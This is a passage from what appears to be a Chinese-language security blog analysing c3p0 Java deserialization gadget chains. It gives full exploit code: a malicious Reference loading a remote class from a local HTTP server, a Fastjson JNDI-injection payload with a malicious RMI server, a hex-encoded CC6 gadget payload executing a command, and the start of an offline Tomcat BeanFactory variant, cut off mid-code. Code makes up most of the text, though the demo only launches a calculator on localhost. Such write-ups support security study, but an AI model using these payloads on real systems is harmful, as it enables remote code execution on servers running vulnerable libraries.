class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;ExpClass&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//序列化流写入文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后去起一个8888端口的服务器，恶意类放在服务器下即可</p><p><img src="https://cdn.clown2024.cn/image-20241101194419904.png" alt="image-20241101194419904"></p><h2 id="jndi注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>该链子依赖于Fastjson和Jackson反序列化漏洞</p><p><strong>利用链</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#修改jndiName<br>JndiRefConnectionPoolDataSource#setJndiName -&gt;<br>JndiRefDataSourceBase#setJndiName<br> <br>#JNDI调用<br>JndiRefConnectionPoolDataSource#setLoginTimeout -&gt;<br>WrapperConnectionPoolDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#inner -&gt;<br>JndiRefForwardingDataSource#dereference() -&gt;<br>Context#lookup<br></code></pre></td></tr></table></figure><p>可以看到利用链都是从setter方法开始的，所以就可以很好配合fastjson或者Jackson利用链</p><h3 id="流程分析"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>其漏洞点在于JndiRefConnectionPoolDataSource类中，该类有许多的setter和getter方法，其中我们可以通过setJndiName方法来给属性jndiName赋值</p><p><img src="https://cdn.clown2024.cn/image-20241102001706522.png" alt="image-20241102001706522"></p><p>他这里调用JndiRefConnectionPoolDataSource#setJndiName方法的时候，会再跳到JndiRefDataSourceBase#setJndiName方法</p><p><img src="https://cdn.clown2024.cn/image-20241102001802528.png" alt="image-20241102001802528"></p><p>修改了name之后我们就需要去触发调用，利用到的是JndiRefConnectionPoolDataSource#setLoginTimeout方法</p><p><img src="https://cdn.clown2024.cn/image-20241102002128576.png" alt="image-20241102002128576"></p><p>然后调用WrapperConnectionPoolDataSource#setLoginTimeout方法</p><p><img src="https://cdn.clown2024.cn/image-20241102002251962.png" alt="image-20241102002251962"></p><p>这里的getNestedDataSource返回的是JndiRefForwardingDataSource，因此这里调用的最终是<code>JndiRefForwardingDataSource#setLoginTimeout</code></p><p><img src="https://cdn.clown2024.cn/image-20241102002633572.png" alt="image-20241102002633572"></p><p>然后就是进入inner()方法</p><p><img src="https://cdn.clown2024.cn/image-20241102002706468.png" alt="image-20241102002706468"></p><p>在dereference()方法触发了jndi调用</p><p><img src="https://cdn.clown2024.cn/image-20241102002741246.png" alt="image-20241102002741246"></p><h3 id="利用链构造"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>选个低版本的fastjson来做例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意rmi服务</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMI_Server</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">&quot;Registry运行中......&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMI_Server</span>().register();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类用前面远程类加载的那个</p><p><img src="https://cdn.clown2024.cn/image-20241103003238269.png" alt="image-20241103003238269"></p><h2 id="利用hex流加载任意类"><a href="#利用HEX流加载任意类" class="headerlink" title="利用HEX流加载任意类"></a>利用HEX流加载任意类</h2><p>该利用链能够反序列化一串十六进制字符串</p><p><strong>利用链</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#设置userOverridesAsString属性值<br>WrapperConnectionPoolDataSource#setuserOverridesAsString -&gt;<br>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString<br> <br>#初始化类时反序列化十六进制字节流<br>WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt;<br>C3P0ImplUtils#parseUserOverridesAsString -&gt;<br>SerializableUtils#fromByteArray -&gt;<br>SerializableUtils#deserializeFromByteArray -&gt;<br>ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="流程分析"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h3><p>该链子的成因是因为WrapperConnectionPoolDataSource的构造方法中对属性userOverrides的赋值存在异样写法</p><p><img src="https://cdn.clown2024.cn/image-20241103222535119.png" alt="image-20241103222535119"></p><p>这里调用C3P0ImplUtils#parseUserOverridesAsString方法将userOverrides解析成String，但userOverrides本身就是String类型，我们跟进去看看这个方法做了什么</p><p><img src="https://cdn.clown2024.cn/image-20241103223316471.png" alt="image-20241103223316471"></p><p>这里会将userOverrides的HASM_HEADER变量后面的十六进制字符串截取出来，HASM_HEADER的值为”HexAsciiSerializedMap”，还会将最后一位给去掉，所以我们后面设置变量的值的时候要加上这个字符串，而且最后一位加上多一个字符比如”;”来占位</p><p>然后解析该十六进制字符串为字节数组，并调用SerializableUtils#deserializeFromByteArray方法来处理字节数组，继续跟进去看看</p><p><img src="https://cdn.clown2024.cn/image-20241103224452045.png" alt="image-20241103224452045"></p><p>欸看到这个方法就很熟悉，字面意思就是反序列化该字节数组，再跟进去</p><p><img src="https://cdn.clown2024.cn/image-20241103224710588.png" alt="image-20241103224710588"></p><p>就可以看到直接调用了readObject方法</p><h3 id="利用链构造"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>上面的利用链构造就很简单了，直接用cc6的字节码来做示例</p><p>这里就直接用的枫师傅的exp，使用的是fastjson来触发利用链</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyVetoException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hex_Attack</span> &#123;<br><br>    <span class="hljs-comment">//CC6的利用链</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">CC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//使用InvokeTransformer包装一下</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;abc&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap2.put(tiedMapEntry,<span class="hljs-string">&quot;eee&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;abc&quot;</span>);<br><br><br>        <span class="hljs-comment">//反射修改LazyMap类的factory属性</span><br>        Class clazz=LazyMap.class;<br>        Field factoryField= clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        <span class="hljs-keyword">return</span> hashMap2;<br>    &#125;<br><br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span> b, StringWriter sw)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ub</span> <span class="hljs-operator">=</span> b &amp; <span class="hljs-number">0xff</span>; <span class="hljs-comment">//转成无符号整数</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> ub / <span class="hljs-number">16</span>;  <span class="hljs-comment">//计算高位十六进制数字</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> ub % <span class="hljs-number">16</span>;  <span class="hljs-comment">//计算地位十六进制数字</span><br>        sw.write(toHexDigit(h1)); <span class="hljs-comment">//转换成字符然后写入</span><br>        sw.write(toHexDigit(h2));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">toHexDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> h)</span><br>    &#123;<br>        <span class="hljs-comment">//逐个字符进行转换</span><br>        <span class="hljs-type">char</span> out;<br>        <span class="hljs-keyword">if</span> (h &lt;= <span class="hljs-number">9</span>) out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-keyword">else</span> out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x37</span>);<br>        <span class="hljs-comment">//System.err.println(h + &quot;: &quot; + out);</span><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">//将类序列化为字节数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] tobyteArray(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">//字节数组转十六进制</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>(len * <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i)<br>            addHexAscii(bytes[i], sw);<br>        <span class="hljs-keyword">return</span> sw.toString();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> toHexAscii(tobyteArray(CC6()));<span class="hljs-comment">//获取十六进制字符串</span><br>        System.out.println(hex);<br><br>        <span class="hljs-comment">//Fastjson&lt;1.2.47</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="hljs-string">&quot;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241103225728831.png" alt="image-20241103225728831"></p><p>低版本fastjson也可以直接用简单一点的payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;&quot; +<br>        &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +<br>        &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +<br>        &quot;&#125;&quot;;<br></code></pre></td></tr></table></figure><p><strong>特殊的地方</strong></p><p>但根据上面的利用流程来看，如果配合fastjson的链子，这里我们的WrapperConnectionPoolDataSource类至少需要调用两次构造方法，第一个次是调用我们的setter方法，第二次是调用构造方法触发链子</p><p>关键的地方就在他的setUserOverridesAsString方法里面，我们去看一下</p><p><img src="https://cdn.clown2024.cn/image-20241103235801196.png" alt="image-20241103235801196"></p><p>当我们调用该setter时，首先会与旧的<code>userOverridesAsString</code>属性比较，这里旧值为<code>null</code>，新值为我们构造的<code>userOverridesAsString</code>，因此这里会进入if判断。</p><p>一路跟进方法，最终到<code>WrapperConnectionPoolDataSource#vetoableChange</code>方法</p><p><img src="https://cdn.clown2024.cn/image-20241104000506391.png" alt="image-20241104000506391"></p><p>这里propName就是userOverridesAsString，我们会走到这个判断里面，然后直接调用C3P0ImplUtils#parseUserOverridesAsString方法对我们传入的十六进制字符串进行解析，就减少了一次需要调用构造函数的操作</p><h1 id="c3p0不出网利用"><a href="#C3P0不出网利用" class="headerlink" title="C3P0不出网利用"></a>C3P0不出网利用</h1><p>C3P0不出网的利用条件较为苛刻，而且需要存在Tomcat8的依赖环境</p><p>跟jndi高版本绕过类似，但是jndi高版本绕过还没学，体会不到，所以先空一下到时再补🫡</p><p>十二月份有机会来补一下了🫡</p><p>jdni的高版本绕过中，我们知道有一种方式就是利用Tomcat的BeanFactory的getObjectInstace方法，来进行EL表达式的注入</p><p>回头看前面远程类加载中的ReferenceableUtils#referenceToObject方法</p><p><img src="https://cdn.clown2024.cn/image-20241203204529365.png" alt="image-20241203204529365"></p><p>欸可以发现，这里完美的符合jndi高版本绕过的方式，只要将这个Factory设置为BeanFactory即可，然后就可以在不出网的情况下进行jndi注入了</p><p>先导入下面三个类方便利用测试</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-el-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="利用链构造"><a href="#利用链构造-3" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>我们知道BeanFactory需要传入ResourceRef类，我们在getReference方法中返回ResourceRef即可</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoInternet_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span 